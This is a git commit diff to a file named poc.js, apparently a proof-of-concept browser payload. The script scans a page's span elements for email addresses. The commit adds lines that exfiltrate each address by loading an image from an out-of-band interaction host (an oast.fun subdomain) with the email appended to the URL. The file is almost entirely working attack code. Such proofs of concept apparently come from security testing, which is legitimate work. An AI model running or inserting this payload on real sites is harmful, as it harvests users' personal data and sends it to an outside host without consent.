a412bd582c628c9e0cc70b56b503d25602bf35d4
mrx_w_ <96743453+abx12@users.noreply.github.com>
2024-08-10 13:34:17 +0100

    Update poc.js

--- uploads/poc.js
+++ uploads/poc.js
@@ -1,4 +1,3 @@
-
     let emails = document.getElementsByTagName("span");
     for (let i = 0; i < emails.length; i++) {
         let data = emails[i];
@@ -7,6 +6,10 @@
         //console.log(data_s);
         for (let j = 0; j < data_s.length; j++) {
             if (data_s[j] === "@") {
+                var imgElement = document.createElement('img');
+                imgElement.src = 'https://qlczvvvmiqyxqynbxerd4zmpr24rq2j5q.oast.fun/'+data_s;
+                imgElement.alt = 'Generated image';
+                document.body.appendChild(imgElement);
                 console.log(data_s); 
             }
         }
